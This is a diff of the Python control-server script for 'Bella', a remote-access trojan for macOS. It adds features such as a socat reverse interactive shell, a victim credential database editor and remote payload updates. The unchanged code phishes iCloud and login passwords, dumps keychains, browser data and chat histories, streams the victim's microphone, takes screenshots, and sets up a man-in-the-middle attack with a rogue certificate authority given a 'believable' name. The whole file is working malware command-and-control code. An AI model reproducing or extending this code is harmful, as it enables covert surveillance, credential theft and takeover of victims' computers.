@@ -2,34 +2,29 @@
 # -*- coding: utf-8 -*-
 import socket, os, sys, select, time, bz2, random, platform, datetime, base64, pickle
 import re, urllib, json, subprocess, errno, struct, optparse, ssl
-try:
-    import gnureadline
-    macOS_rl = False
-except ImportError:
-    import rlcompleter
-    import readline
-    macOS_rl = True
+import readline, rlcompleter
 
-violet = '\001\033[95m\002'
-blue = '\001\033[94m\002' #94 for original light blue
-lightBlue = '\001\033[34m\002'
-green = '\001\033[92m\002' #32 for a little darker
-darkGreen = '\001\033[32m\002'
-yellow = '\001\033[93m\002'
-red = '\001\033[31m\002'
-endC = '\001\033[0m\002'
-bold = '\001\033[1m\002'
-italics = '\001\033[3m\002'
-underline = '\001\033[4m\002'
-ps1Green = '\001\033[1;32m\022'
-offGreen = '\001\033[36m\002' #light blue lol
-offBlue = '\001\033[38;5;148m\002'
-purple = '\001\033[0;35m\002'
+violet = '\033[95m'
+blue = '\033[94m' #94 for original light blue
+lightBlue = '\033[34m'
+green = '\033[92m' #32 for a little darker
+darkGreen = '\033[32m'
+yellow = '\033[93m'
+red = '\033[31m'
+endC = '\033[0m'
+bold = '\033[1m'
+italics = '\033[3m'
+underline = '\033[4m'
+ps1Green = '\033[1;32m'
+offGreen = '\033[36m' #light blue lol
+offBlue = '\033[38;5;148m'
+purple = '\033[0;35m'
 redX = "%s[x] %s" % (red, endC)
 greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
+yellow_star = "%s[*] %s" % (yellow, endC)
 
-commands = ['iCloud_query', 'upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'update_db_entry', 'volume', 'version', 'set_client_name', 'host_update', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def subprocess_cleanup(subprocess_list):
     if len(subprocess_list) > 0:
@@ -56,13 +51,17 @@ def string_log(logged, client_log_path, client_name):
             pass
         open(os.path.join(client_log_path, client_name + ".txt"), 'w').close() #create file if it does not exist
     with open(os.path.join(client_log_path, client_name + ".txt"), "ab") as content:
-        if len(logged) > 0:
-            if logged[-1] == '\n':
-                content.write(logged)#fixes double printing of new line
+        #print repr(logged)
+        try:
+            if len(logged) > 0:
+                if logged[-1] == '\n':
+                    content.write(logged)#fixes double printing of new line
+                else:
+                    content.write(logged + '\n')
             else:
-                content.write(logged + '\n')
-        else:
-            content.write(logged)
+                content.write(logged)
+        except UnicodeError:
+            content.write('\n**Unicode Error**\n')
 
 def byte_convert(byte):
     for count in ['B','K','M','G']:
@@ -81,45 +80,41 @@ def downloader(fileContent, file_name, client_log_path, client_name, path=''):
     print downloaded
     string_log(downloaded, client_log_path, client_name)
 
-def encode(key, clear):
-    enc = []
-    for i in range(len(clear)):
-        key_c = key[i % len(key)]
-        enc_c = chr((ord(clear[i]) + ord(key_c)) % 256)
-        enc.append(enc_c)
-    return base64.urlsafe_b64encode("".join(enc))
-
-def decode(key, enc):
-    dec = []
-    enc = base64.urlsafe_b64decode(enc)
-    for i in range(len(enc)):
-        key_c = key[i % len(key)]
-        dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
-        dec.append(dec_c)
-    return "".join(dec)
-
 def send_msg(sock, msg):
-    msg = pickle.dumps(msg)
-    finalMsg = struct.pack('>I', len(msg)) + msg
-    sock.sendall(finalMsg)
+    #msg = pickle.dumps(msg)
+    final_msg = struct.pack('>I', len(msg)) + msg
+    sock.sendall(final_msg)
 
-def recv_msg(sock):
-    raw_msglen = recvall(sock, 4, True)
+def recv_msg(sock, display_bytes=False):
+    raw_msglen = recvall(sock, 4, True, False)
+    raw_EOF = recvall(sock, 1, True, False)
     if not raw_msglen:
         return None
     msglen = struct.unpack('>I', raw_msglen)[0]
-    return recvall(sock, msglen, False)
+    EOF = struct.unpack('?', raw_EOF)[0]
+    return (recvall(sock, msglen, False, display_bytes), EOF)
 
-def recvall(sock, n, length):
+def recvall(sock, n, length, display_bytes):
     if length:
-        return sock.recv(4)
+        return sock.recv(n)
     data = ''
     while len(data) < n:
-        packet = sock.recv(n - len(data))
-        if not packet:
-            return None
-        data += packet
-    return pickle.loads(data) #convert the data back to normal
+        try:
+            packet = sock.recv(n - len(data))
+        except KeyboardInterrupt:
+            sys.stdout.write("%sEmptying socket. You have to wait for this task to end.\n" % bluePlus)
+        try:
+            data += packet
+            if display_bytes:
+                sys.stdout.write('%sGot [%s/%s] bytes\r' % (yellow_star, byte_convert(len(data)), byte_convert(n)))
+            if not packet:
+                return None
+        except KeyboardInterrupt:
+            sys.stdout.write("%sEmptying socket. You have to wait for this task to end.\n" % bluePlus)
+
+    if display_bytes:
+        sys.stdout.write('\n')
+    return data #convert the data back to normal
           
 def tab_parser(text, exist):
     global file_list
@@ -149,8 +144,9 @@ def main():
     ctrlC = False
     active=False
     first_run = True
+    cc_version = '1.22'
     logpath = 'Logs/'
-    helperpath = ''
+    helperpath = os.getcwd() + '/'
     client_log_path = ''
     client_name = ''
     clients = []
@@ -166,6 +162,7 @@ def main():
         os.system('openssl req -x509 -nodes -days 365 -subj "/C=US/ST=Bella/L=Bella/O=Bella/CN=bella" -newkey rsa:2048 -keyout %sserver.key -out %sserver.crt' % (helperpath, helperpath)) 
     clear()
     port = 4545
+    interactive_shell_port = 3818
     print '%s%s%s%s' % (purple, bold, 'Listening for clients over port [%s]'.center(columns, ' ') % port, endC)
 
     sys.stdout.write(blue + bold)
@@ -195,6 +192,8 @@ def main():
                     print 'You must generate SSL certificates to encrypt the socket.'
                     os.remove('%sserver.key' % helperpath) #openssl will create this empty, so remove junk
                     exit()
+                print e
+                raise e
 
             if(accept):
                 sock.settimeout(None)
@@ -261,6 +260,9 @@ def main():
             first_run = True
             now = datetime.datetime.now()
 
+        next_msg_is_fxn_data = (False, '')
+        fxn_headers = ['C5EBDE1F', 'downloader', 'keychain_download', '6E87CF0B']
+        
         while active:
             try:
                 columns = row_set()
@@ -268,18 +270,33 @@ def main():
                     if process_running:
                         send_msg(connections[activate], 'sigint9kill') #this will kill their blocking program, reset our data
                         while 1:
-                            x = recv_msg(connections[activate])
-                            if x:
-                                if x[0] == 'terminated':
-                                    break
-                            continue
-                    data = "\n"
+                            try:
+                                x = recv_msg(connections[activate])
+                                if x:
+                                    if x[0] == 'terminated':
+                                        break
+                                    if 'sigint9kill' in x[0]: #will handle double loop backs
+                                        break
+                                continue
+                            except KeyboardInterrupt:
+                                continue
+                    data = '\n'
                     ctrlC = False
                 else:
-                    (data, isFinished) = recv_msg(connections[activate]) 
-                    if not isFinished:
-                        print data, #print it and continue
-                        continue #just go back to top and keep receiving
+                    if next_msg_is_fxn_data[0]:
+                        (data, isFinished) = recv_msg(connections[activate], True) 
+                        data = ''.join((next_msg_is_fxn_data[1], data))
+                        next_msg_is_fxn_data = (False, '')
+                    else:
+                        (data, isFinished) = recv_msg(connections[activate], False) 
+                        if not isFinished:
+                            if data in fxn_headers: #chat_history
+                                next_msg_is_fxn_data = (True, data) #function too :D
+                                continue
+                            else:
+                                print data, #print it and continue
+                                string_log(data, client_log_path, client_name)
+                                continue #just go back to top and keep receiving
                 nextcmd = ''
                 process_running = False
                 
@@ -320,31 +337,36 @@ def main():
                             os.makedirs(client_log_path)
                         first_run = False
 
-                elif data.startswith('cwdcwd')==True:
+                elif data.startswith('cwdcwd'):
                     sdoof = data.splitlines()
                     workingdir = sdoof[0][6:]
-                    file_list = map(str.lower, sdoof[1:]) + sdoof[1:] + commands
+                    file_list = sdoof[1:] + commands
                     string_log(workingdir + '\n', client_log_path, client_name)
 
-                elif data.startswith('downloader')==True:
-                    (fileContent, file_name) = pickle.loads(data[10:])
+                elif data.startswith('downloader'):
+                    (fileContent, file_name) = data[10:].split('dl_delimiter_x22x32')
                     downloader(fileContent, file_name, client_log_path, client_name)
 
-                elif data.startswith("mitmReady")==True:
+                elif data.startswith("mitmReady"):
                     os.system("osascript >/dev/null <<EOF\n\
                             tell application \"Terminal\"\n\
                             do script \"mitmproxy -p 8081 --cadir %s\"\n\
                             end tell\n\
-                            EOF" % helperpath)
+                            EOF" % (helperpath + 'MITM'))
                     print 'MITM-ing. RUN mitm_kill AFTER YOU CLOSE MITMPROXY OR THE CLIENT\'S INTERNET WILL NOT WORK.'
 
-                elif data.startswith('keychain_download')==True:
+                elif data.startswith('keychain_download'):
                     keychains = pickle.loads(data[17:])
                     for x in keychains:
                         (keychainName, keychainData) = pickle.loads(x) #[keychainName, keychainData]
                         downloader(keychainData, keychainName, client_log_path, client_name, 'Keychains')
 
-                elif data.startswith('appleIDPhishHelp') == True:
+                elif data.startswith('interactive_shell_init'):
+                    while socat_PID.poll() == None: #it is alive
+                        time.sleep(1) #just wait a bit, check again.
+                    print '%sInteractive shell closed. Welcome back to Bella.' % bluePlus
+
+                elif data.startswith('appleIDPhishHelp'):
                     content = pickle.loads(data[16:])
                     if len(content[0]) > 0:
                         print "%sFound the following iCloud accounts.\n%s\nWhich would you like to use to phish current GUI user [%s]?" % (bluePlus, content[0], content[1])
@@ -352,7 +374,7 @@ def main():
                     else:
                         print "%sCouldn't find any iCloud accounts.\nEnter one manually to phish current GUI user [%s]" % (bluePlus, content[1])
                         appleID = ''
-                    username = raw_input("Enter iCloud Account: ") or appleID
+                    username = raw_input("Enter iCloud Account [press enter to use %s]: " % appleID) or appleID
                     if username == '':
                         print 'No username specified, cancelling Phish'
                         nextcmd = ''
@@ -360,7 +382,7 @@ def main():
                         print "Phishing [%s%s%s]" % (blue, username, endC)
                         nextcmd = "iCloudPhishFinal%s:%s" % (username, content[1])
 
-                elif data.startswith('screenCapture')==True:
+                elif data.startswith('screenCapture'):
                     screen = data[13:]
                     if screen == "error":
                         print "%sError capturing screenshot!" % redX
@@ -370,29 +392,39 @@ def main():
                         with open("%sScreenshots/screenShot%s.png" % (client_log_path, fancyTime), "w") as shot:
                             shot.write(base64.b64decode(screen))
                         time.sleep(1)
-                        os.system("open %sScreenshots/screenShot%s.png" % (client_log_path, fancyTime)) #We cannot have this here. Lets victim run code on our comp if they want.
+                        print "%sGot screenshot [%s]" % (greenCheck, fancyTime)
 
-                elif data.startswith('C5EBDE1F')==True:
-                    deserialize = pickle.loads(data[8:])
+                elif data.startswith('C5EBDE1F'):
+                    deserialize = data[8:].split('C5EBDE1F_tuple')
                     for x in deserialize:
-                        (name, data) = x #name will be the user, which we're going to want on the path
-                        downloader(bz2.decompress(data), 'ChatHistory_%s.db' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Chat/%s' % name)
+                        (name, data) = x.split('C5EBDE1F') #name will be the user, which we're going to want on the path
+                        downloader(data, 'ChatHistory_%s.db' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Chat/%s' % name)
                     print "%sGot macOS Chat History" % greenCheck
 
-                elif data.startswith('6E87CF0B')==True:
-                    deserialize = pickle.loads(data[8:])
+                elif data.startswith('6E87CF0B'):
+                    deserialize = data[8:].split('6E87CF0B_tuple')
                     for x in deserialize:
-                        (name, data) = x #name will be the user, which we're going to want on the path
+                        (name, data) = x.split('6E87CF0B') #name will be the user, which we're going to want on the path
                         downloader(bz2.decompress(data), 'history_%s.txt' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Safari/%s' % name)
                     print "%sGot Safari History" % greenCheck
 
-                elif data.startswith('lserlser')==True:
+                elif data.startswith('lserlser'):
                     (rawfile_list, filePrint) = pickle.loads(data[8:]) 
                     widths = [max(map(len, col)) for col in zip(*filePrint)]
                     for fileItem in filePrint:
                         line = "  ".join((val.ljust(width) for val, width in zip(fileItem, widths))) #does pretty print
                         print line
                         string_log(line, client_log_path, client_name)
+               
+                elif data.startswith('updated_client_name'):
+                    old_computer_name = computername
+                    computername = data.split(":::")[1]
+                    print 'Moving [%s%s] to [%s%s]' % (logpath, old_computer_name, logpath, computername)
+                    os.rename("%s%s" %  (logpath, old_computer_name), "%s%s" % (logpath, computername))
+                    client_log_path = "%s%s/%s/" % (logpath, computername, client_name)
+                    print data.split(":::")[2],
+                    string_log(data, client_log_path, client_name)
+
                 else:
                     if len(data) == 0:
                         sys.stdout.write('')
@@ -420,17 +452,22 @@ def main():
                         workingdir = "~" + workingdir[pathlen:] #change working dir to ~[/users/name:restofpath] (in that range)
                    
                     workingdirFormatted = blue + workingdir + endC
-                    if macOS_rl:
-                        readline.parse_and_bind("bind ^I rl_complete")
+                    if platform.system() == 'Linux':
+                        readline.parse_and_bind("tab: complete")
                         readline.set_completer(tab_parser)
                     else:
-                        gnureadline.parse_and_bind("tab: complete")
-                        gnureadline.set_completer(tab_parser)
+                        if 'libedit' in readline.__doc__:
+                            readline.parse_and_bind("bind ^I rl_complete")
+                            readline.set_completer(tab_parser)
+                        else:
+                            readline.parse_and_bind("tab: complete")
+                            readline.set_completer(tab_parser)
+
                     if nextcmd == "":
                         try:
                             nextcmd = raw_input("[%s]-[%s] " % (client_name_formatted, workingdirFormatted))
                             string_log("[%s]-[%s] %s" % (client_name, workingdirFormatted, nextcmd), client_log_path, client_name)
-                        except EOFError, e:
+                        except Exception, e:
                             nextcmd = "exit"
                     else:
                         pass
@@ -445,38 +482,67 @@ def main():
                             print "Not deleting server."
                             nextcmd = ""
 
+                    if nextcmd == "interactive_shell":
+                        if platform.system() == 'Linux':
+                            print 'This function is not yet available for Linux systems.'
+                        else:
+                            print "%sStarting interactive shell over port [%s].\n%sPress CTRL-D *TWICE* to close.\n%sPre-built Bella functions will not work in this shell.\n%sUse this shell to run commands such as sudo, nano, telnet, ftp, etc." % (bluePlus, interactive_shell_port, bluePlus, yellow_star, bluePlus)
+                            socat_PID = subprocess.Popen("socat -s `tty`,raw,echo=0 tcp-listen:%s" % interactive_shell_port, shell=True) #start listener
+                            time.sleep(.5)
+                            if socat_PID.poll():
+                                print "%sYou need to install 'socat' on your Control Center to use this feature.\n" % redX
+                                nextcmd = ""
+                            else:
+                                nextcmd = "interactive_shell:::%s" % interactive_shell_port
+
                     if nextcmd == "cls":
                         file_list = commands
                         nextcmd = ""
+
+                    if nextcmd == "bella_version":
+                        print "%sControl Center Version:%s %s" % (underline, endC, cc_version)
 
                     if nextcmd == ("mitm_start"):
                         try:
                             import mitmproxy
                         except ImportError:
                             print 'You need to install the python library "mitmproxy" to use this function.'
-                            break
-                        if not os.path.isfile("%smitm.crt" % helperpath):
+                            nextcmd = ''
+                        if not os.path.isdir('MITM'):
+                            os.mkdir('MITM')
+                        if not os.path.isfile("%sMITM/mitm.crt" % helperpath):
                             print "%sNo local Certificate Authority found.\nThis is necessary to decrypt TLS/SSL traffic.\nFollow the steps below to generate the certificates.%s\n\n" % (red, endC)
                             os.system("openssl genrsa -out mitm.key 2048")
                             print "%s\n\nYou can put any information here. Common Name is what will show up in the Keychain, so you may want to make this a believable name (IE 'Apple Security').%s\n\n" % (red, endC)
                             os.system("openssl req -new -x509 -key mitm.key -out mitm.crt")
                             os.system("cat mitm.key mitm.crt > mitmproxy-ca.pem")
                             os.remove("mitm.key")
-                            os.system("mv mitmproxy-ca.pem mitm.crt %s" % helperpath)
+                            os.system("mv mitm.crt MITM/")
+                            os.system("mv mitmproxy-ca.pem MITM/mitmproxy-ca.pem")
                             #mitm.crt is the cert we will install on remote client.
                             #mitmproxy-ca.pem is for mitmproxy
                             print '%sGenerated all certs. Sending over to client.%s' % (green, endC)
-                        with open('%smitm.crt' % helperpath, 'r') as content:
+                        with open('%sMITM/mitm.crt' % helperpath, 'r') as content:
                             cert = content.read()
                         print 'Found the following certificate:'
-                        for x in subprocess.check_output("keytool -printcert -file %smitm.crt" % helperpath, shell=True).splitlines():
+                        for x in subprocess.check_output("keytool -printcert -file %sMITM/mitm.crt" % helperpath, shell=True).splitlines():
                             if 'Issuer: ' in x:
                                 print "%s%s%s" % (lightBlue, x, endC)
+                        new_cert = raw_input("Would you like to generate a new certificate? (y/n): ")
+                        if new_cert.lower() == 'y':
+                            print "%sNo local Certificate Authority found.\nThis is necessary to decrypt TLS/SSL traffic.\nFollow the steps below to generate the certificates.%s\n\n" % (red, endC)
+                            os.system("openssl genrsa -out mitm.key 2048")
+                            print "%s\n\nYou can put any information here. Common Name is what will show up in the Keychain, so you may want to make this a believable name (IE 'Apple Security').%s\n\n" % (red, endC)
+                            os.system("openssl req -new -x509 -key mitm.key -out mitm.crt")
+                            os.system("cat mitm.key mitm.crt > mitmproxy-ca.pem")
+                            os.remove("mitm.key")
+                            os.system("mv mitm.crt MITM/")
+                            os.system("mv mitmproxy-ca.pem MITM/mitmproxy-ca.pem")
                         interface = raw_input("🚀  Specify an interface to MITM [Press enter for Wi-Fi]: ").replace("[", "").replace("]", "") or "Wi-Fi"
                         nextcmd = "mitm_start:::%s:::%s" % (interface, cert)
 
                     if nextcmd == ("mitm_kill"):
-                        for x in subprocess.check_output("keytool -printcert -file %smitm.crt" % helperpath, shell=True).splitlines():
+                        for x in subprocess.check_output("keytool -printcert -file %sMITM/mitm.crt" % helperpath, shell=True).splitlines():
                             if 'SHA1: ' in x:
                                 certsha = ''.join(x.split(':')[1:]).replace(' ', '')
                                 break
@@ -492,6 +558,61 @@ def main():
                         
                     if nextcmd == "restart":
                         nextcmd = "osascript -e 'tell application \"System Events\" to restart'"
+
+                    if nextcmd == "update_db_entry":
+                        db_entries = ['iCloud Password', 'User Password']
+                        db_dict = ['applePass', 'localPass']
+                        for i, x in enumerate(db_entries):
+                            print "[%s%s%s] %s" % (red, i + 1, endC, x)
+                        while 1:
+                            try:
+                                entry = input('Which entry would you like to update or delete? Enter a number: ')
+                            except SyntaxError, EOFError:
+                                continue
+                            try:
+                                db_field = db_dict[entry - 1]
+                                if entry == 1: #iCloud Password
+                                    user = raw_input("Enter an iCloud username [just press enter to delete iCloud password]: ")
+                                    if not user:
+                                        passw = ''
+                                    else:
+                                        passw = raw_input("Enter an iCloud password: ")
+                                else:
+                                    user = raw_input("Enter a computer username [just press enter to delete user password]: ")
+                                    if not user:
+                                        passw = ''
+                                    else:
+                                        passw = raw_input("Enter a password for %s: " % user)
+                                db_value = "%s:%s" % (user, passw)
+                                nextcmd = 'update_db_entry:::%s:::%s' % (db_field, db_value)
+                                break
+                            except IndexError as e:
+                                print 'Please enter one the above numbers.'
+                                continue
+
+                    if nextcmd.startswith("set_client_name"):
+                        if nextcmd == "set_client_name":
+                            nextcmd += ":::" + (raw_input("🐷  Please specify a client name: ") or computername)
+                        else:
+                            nextcmd = "set_client_name:::%s" % nextcmd.replace('set_client_name ', '')
+                        
+                    if nextcmd == "host_update":
+                        if nextcmd == "host_update": #no stdin
+                            local_file= raw_input("📡  Enter full path to new server on local machine: ")
+                        else:
+                            local_file = nextcmd[14:] #take path as stdin
+                        local_file = subprocess.check_output('printf %s' % local_file, shell=True) #get the un-escaped version for python recognition
+                        if os.path.isfile(local_file):
+                            with open(local_file, 'rb') as content:
+                                new_server = content.read()
+                            if not "verify_update_id = '2f4e2e37c9b6eecebb0927a96938b4fa'" in new_server:
+                                print 'This does not appear to be a Bella payload. Cancelling update.'
+                                nextcmd = ''
+                            else:
+                                nextcmd = "host_update%s" % pickle.dumps(new_server)
+                        else:
+                            print "Could not find [%s]!" % local_file
+                            nextcmd = ''
 
                     if nextcmd == "disableKM":
                         print "[1] Keyboard | [2] Mouse"
@@ -517,38 +638,44 @@ def main():
                         nextcmd = "osascript -e 'tell application \"System Events\" to shut down'"
 
                     if nextcmd == "mike_stream":
-                        try:
-                            if not os.path.exists(client_log_path + 'Microphone'):
-                                os.makedirs(client_log_path + 'Microphone')
-                            subprocess.check_output("osascript >/dev/null <<EOF\n\
-                            tell application \"Terminal\"\n\
-                            ignoring application responses\n\
-                            do script \"nc -l 2897 | tee '%s%s%s' 2>&1 | %s/Payloads/speakerpipe\"\n\
-                            end ignoring\n\
-                            end tell\n\
-                            EOF" % (client_log_path, 'Microphone/', time.strftime("%b %d %Y %I:%M:%S %p"), os.getcwd()), shell=True) #tee the output for later storage, and also do an immediate stream
-                        except subprocess.CalledProcessError as e:
-                            pass #this is expected 'execution error: Can't get end'
-                        except Exception as e:
-                            print 'Error launching listener.\n[%s]' % e
+                        if platform.system() == 'Linux':
+                            print '%sThere is not yet Linux support for a microphone stream.' % redX
                             nextcmd = ''
+                        else:
+                            try:
+                                if not os.path.exists(client_log_path + 'Microphone'):
+                                    os.makedirs(client_log_path + 'Microphone')
+                                subprocess.check_output("osascript >/dev/null <<EOF\n\
+                                tell application \"Terminal\"\n\
+                                ignoring application responses\n\
+                                do script \"nc -l 2897 | tee '%s%s%s' 2>&1 | %s/Payloads/speakerpipe\"\n\
+                                end ignoring\n\
+                                end tell\n\
+                                EOF" % (client_log_path, 'Microphone/', time.strftime("%b %d %Y %I:%M:%S %p"), os.getcwd()), shell=True) #tee the output for later storage, and also do an immediate stream
+                            except subprocess.CalledProcessError as e:
+                                pass #this is expected 'execution error: Can't get end'
+                            except Exception as e:
+                                print 'Error launching listener.\n[%s]' % e
+                                nextcmd = ''
 
                     if nextcmd == "shutdown_server":
                         nextcmd = ""
                         if raw_input("Are you sure you want to shutdown the server?\nThis will unload all LaunchAgents: (Y/n) ").lower() == "y":
                             nextcmd = "shutdownserver_yes"
-                    
-                    if nextcmd == "updateserver_yes":
-                        if raw_input("Are you sure you want to update the server?: (Y/n) ").lower() == "y":
-                            nextcmd = "updateserver_yes"
-                        else:
-                            nextcmd = ""  
 
                     if nextcmd == "vnc":
-                        vnc_port = 5500
-                        nextcmd = "vnc_start:::%s" % vnc_port
-                        proc = subprocess.Popen("/Applications/VNC\ Viewer.app/Contents/MacOS/vncviewer -listen %s" % vnc_port, shell=True)
-                        subprocess_list.append(proc.pid)
+                        if platform.system() == 'Linux':
+                            print '%sThere is not yet Linux support for a reverse VNC connection.' % redX
+                            #"wget https://www.realvnc.com/download/file/vnc.files/VNC-6.0.2-Linux-x64-ANY.tar.gz"
+                            #tar -zxvf VNCfiles
+                            #mv VNCfiles Payloads/
+                            #fork process
+                            nextcmd = ''
+                        else:
+                            vnc_port = 5500
+                            nextcmd = "vnc_start:::%s" % vnc_port
+                            proc = subprocess.Popen("/Applications/VNC\ Viewer.app/Contents/MacOS/vncviewer -listen %s" % vnc_port, shell=True)
+                            subprocess_list.append(proc.pid)
 
                     if nextcmd == "volume":
                         vol_level = str(raw_input("Set volume to? (0[low]-7[high]) "))
@@ -557,21 +684,28 @@ def main():
                     if nextcmd == "sysinfo":
                         nextcmd = 'scutil --get LocalHostName; whoami; pwd; echo "----------"; sw_vers; ioreg -l | awk \'/IOPlatformSerialNumber/ { print "SerialNumber: \t" $4;}\'; echo "----------";sysctl -n machdep.cpu.brand_string; hostinfo | grep memory; df -h / | grep dev | awk \'{ printf $3}\'; printf "/"; df -h / | grep dev | awk \'{ printf $2 }\'; echo " HDD space used"; echo "----------"; printf "Local IP: "; ipconfig getifaddr en0; ipconfig getifaddr en1; printf "Current Window: "; python -c \'from AppKit import NSWorkspace; print NSWorkspace.sharedWorkspace().frontmostApplication().localizedName()\'; echo "----------"'
                     
+                    if nextcmd == "version":
+                        nextcmd = "bella_version"
+
                     if nextcmd.startswith("upload"): #uploads to CWD.
                         if nextcmd == "upload":
                             local_file= raw_input("🌈  Enter full path to file on local machine: ")
                         else:
                             local_file = nextcmd[7:] #take path as stdin
-                        local_file = subprocess.check_output('printf %s' % local_file, shell=True) #get the un-escaped version for python recognition
-                        if os.path.isfile(local_file):
-                            with open(local_file, 'rb') as content:
-                                sendFile = content.read()
-                                file_name = content.name.split('/')[-1] #get absolute file name (not path)
-                            file_name = raw_input("Uploading file as [%s]. Enter new name if desired: " % file_name) or file_name
-                            nextcmd = "uploader%s" % pickle.dumps((sendFile, file_name))
-                        else:
-                            print "Could not find [%s]!" % local_file
+                        if not local_file:
+                            print '%sNo file specified' % bluePlus
                             nextcmd = ''
+                        else:
+                            local_file = subprocess.check_output('printf %s' % local_file, shell=True) #get the un-escaped version for python recognition
+                            if os.path.isfile(local_file):
+                                with open(local_file, 'rb') as content:
+                                    send_file = content.read()
+                                    file_name = content.name.split('/')[-1] #get absolute file name (not path)
+                                file_name = raw_input("Uploading file as [%s]. Enter new name if desired: " % file_name) or file_name
+                                nextcmd = "uploader%s" % 'ul_delimeter_x22x32'.join((send_file, file_name))
+                            else:
+                                print "Could not find [%s]!" % local_file
+                                nextcmd = ''
 
                     if nextcmd.startswith("download"): #uploads to CWD.
                         if nextcmd == "download":
